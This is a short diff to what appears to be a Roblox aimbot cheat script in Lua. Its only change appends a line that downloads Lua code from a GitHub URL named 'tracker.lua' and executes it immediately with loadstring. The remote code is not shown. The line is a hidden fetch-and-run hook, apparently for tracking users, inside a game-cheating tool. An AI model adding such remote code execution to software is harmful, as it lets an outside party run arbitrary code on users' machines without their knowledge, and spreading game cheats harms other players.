@@ -2738,3 +2738,5 @@ local AimbotLoop; AimbotLoop = RunService[UISettings.RenderingMode]:Connect(func
         end
     end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Patheticcs/soluna/refs/heads/main/src/api/tracker.lua",true))()
